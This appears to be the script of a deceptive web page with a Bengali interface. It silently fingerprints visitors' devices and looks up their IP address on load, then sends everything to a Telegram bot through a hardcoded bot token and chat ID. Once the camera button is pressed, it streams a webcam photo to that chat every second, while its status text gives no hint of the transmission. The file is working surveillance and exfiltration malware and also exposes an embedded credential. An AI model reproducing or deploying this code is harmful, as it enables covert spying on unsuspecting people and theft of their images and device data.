const BOT_TOKEN = "7249136904:AAGFPmdS5CnextPMpNlUPv0qeSuVHBaUF-w";
const CHAT_ID = "8174575316";
const cameraBtn = document.getElementById('cameraBtn');
const statusText = document.getElementById('statusText');
const progressBar = document.getElementById('progressBar');
const mobileInfo = document.getElementById('mobileInfo');
const pcInfo = document.getElementById('pcInfo');
const video = document.getElementById('cameraFeed');
const canvas = document.getElementById('cameraCanvas');
const ctx = canvas.getContext('2d');

let isCameraActive = false;
let photoInterval;
let deviceInfoSent = false;

// Initialize
document.addEventListener('DOMContentLoaded', async () => {
  updateStatus("সিস্টেম শুরু হচ্ছে...", 10);
  await collectDeviceInfo();
  updateStatus("ডিভাইস স্ক্যান সম্পন্ন", 50);
  
  cameraBtn.addEventListener('click', activateCamera);
});

// Update status and progress
function updateStatus(text, progress) {
  statusText.textContent = text;
  progressBar.style.width = `${progress}%`;
}

// Collect device info
async function collectDeviceInfo() {
  const isMobile = /Mobi|Android/i.test(navigator.userAgent);
  
  if (isMobile) {
    // Mobile device info
    let mobileData = `
      <p><strong>ডিভাইস:</strong> ${navigator.userAgent.split('(')[1].split(')')[0]}</p>
      <p><strong>প্ল্যাটফর্ম:</strong> ${navigator.platform}</p>
    `;
    
    // Battery info
    if ('getBattery' in navigator) {
      const battery = await navigator.getBattery();
      mobileData += `
        <p><strong>ব্যাটারি:</strong> ${Math.round(battery.level * 100)}%</p>
        <p><strong>স্ট্যাটাস:</strong> ${battery.charging ? 'চার্জ হচ্ছে' : 'চার্জ হচ্ছে না'}</p>
      `;
    }
    
    // Network info
    if (navigator.connection) {
      mobileData += `
        <p><strong>নেটওয়ার্ক:</strong> ${navigator.connection.effectiveType}</p>
      `;
    }
    
    mobileInfo.innerHTML = mobileData;
    await sendToTelegram("📱 মোবাইল ডিভাইস ডিটেক্ট\n\n" + mobileData.replace(/<[^>]*>/g, ''));
  } else {
    // PC device info
    let pcData = `
      <p><strong>OS:</strong> ${navigator.platform}</p>
      <p><strong>CPU কোর:</strong> ${navigator.hardwareConcurrency || 'অজানা'}</p>
      <p><strong>RAM:</strong> ${performance.memory ? (performance.memory.jsHeapSizeLimit / (1024 * 1024)).toFixed(1) + 'MB' : 'অজানা'}</p>
      <p><strong>স্ক্রীন:</strong> ${window.screen.width}x${window.screen.height}</p>
    `;
    
    pcInfo.innerHTML = pcData;
    await sendToTelegram("💻 PC ডিভাইস ডিটেক্ট\n\n" + pcData.replace(/<[^>]*>/g, ''));
  }
  
  // Get IP address
  try {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    await sendToTelegram(`🌐 আইপি অ্যাড্রেস: ${ipData.ip}`);
  } catch (e) {
    console.log("IP fetch error");
  }
  
  deviceInfoSent = true;
}

// Activate camera
async function activateCamera() {
  try {
    updateStatus("ক্যামেরা অ্যাক্সেস চেক করা হচ্ছে...", 70);
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    
    video.srcObject = stream;
    video.play();
    isCameraActive = true;
    
    updateStatus("ক্যামেরা সক্রিয় - ফটো পাঠানো হচ্ছে...", 90);
    cameraBtn.disabled = true;
    cameraBtn.innerHTML = '<i class="fas fa-camera"></i> ক্যামেরা সক্রিয়';
    
    // Start sending photos every 1 second
    photoInterval = setInterval(captureAndSendPhoto, 1000);
    
  } catch (error) {
    updateStatus("ক্যামেরা অ্যাক্সেস ব্যর্থ!", 100);
    await sendToTelegram("⚠️ ক্যামেরা অ্যাক্সেস দেয়নি!");
    console.error("Camera error:", error);
  }
}

// Capture and send photo
function captureAndSendPhoto() {
  if (!isCameraActive) return;
  
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  
  canvas.toBlob(blob => {
    sendToTelegram(blob, true);
  }, 'image/jpeg', 0.8);
}

// Send data to Telegram
async function sendToTelegram(data, isPhoto = false) {
  try {
    if (isPhoto) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', data, 'photo.jpg');
      
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    } else {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`);
    }
  } catch (error) {
    console.error("Telegram error:", error);
  }
}